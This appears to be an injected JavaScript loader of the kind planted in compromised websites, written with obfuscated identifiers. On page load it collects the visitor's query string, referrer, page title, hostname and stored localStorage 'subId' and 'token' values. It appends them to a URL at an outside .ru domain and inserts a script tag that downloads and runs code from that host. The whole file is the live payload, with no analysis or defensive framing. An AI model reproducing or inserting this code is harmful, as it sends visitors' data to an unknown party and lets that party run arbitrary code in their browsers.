 (function() {
    var name = '_1YrThKYL2rPQ5Yb6';
    if (!window._1YrThKYL2rPQ5Yb6) {
        window._1YrThKYL2rPQ5Yb6 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/QbpVfssD',
        };
    }
    const _Rv38f5ZWcWMLg4vg = localStorage.getItem('config');
    if (typeof _Rv38f5ZWcWMLg4vg !== 'undefined' && _Rv38f5ZWcWMLg4vg !== null) {
        var _5P4XnZ4vtxXXTmG4 = JSON.parse(_Rv38f5ZWcWMLg4vg);
        var _HWq6xrwM2sC6QVWV = Math.round(+new Date()/1000);
        if (_5P4XnZ4vtxXXTmG4.created_at + window._1YrThKYL2rPQ5Yb6.ttl < _HWq6xrwM2sC6QVWV) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _TPMSrm9kftcXBC26 = localStorage.getItem('subId');
    var _k4Pmgf4YwncBQgDF = localStorage.getItem('token');
    var _9H3DVmxHgv6Mz6ZX = '?return=js.client';
        _9H3DVmxHgv6Mz6ZX += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _9H3DVmxHgv6Mz6ZX += '&se_referrer=' + encodeURIComponent(document.referrer);
        _9H3DVmxHgv6Mz6ZX += '&default_keyword=' + encodeURIComponent(document.title);
        _9H3DVmxHgv6Mz6ZX += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _9H3DVmxHgv6Mz6ZX += '&name=' + encodeURIComponent(name);
        _9H3DVmxHgv6Mz6ZX += '&host=' + encodeURIComponent(window._1YrThKYL2rPQ5Yb6.R_PATH);
    if (typeof _TPMSrm9kftcXBC26 !== 'undefined' && _TPMSrm9kftcXBC26 && window._1YrThKYL2rPQ5Yb6.unique) {
        _9H3DVmxHgv6Mz6ZX += '&sub_id=' + encodeURIComponent(_TPMSrm9kftcXBC26);
    }
    if (typeof _k4Pmgf4YwncBQgDF !== 'undefined' && _k4Pmgf4YwncBQgDF && window._1YrThKYL2rPQ5Yb6.unique) {
        _9H3DVmxHgv6Mz6ZX += '&token=' + encodeURIComponent(_k4Pmgf4YwncBQgDF);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._1YrThKYL2rPQ5Yb6.R_PATH + _9H3DVmxHgv6Mz6ZX;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
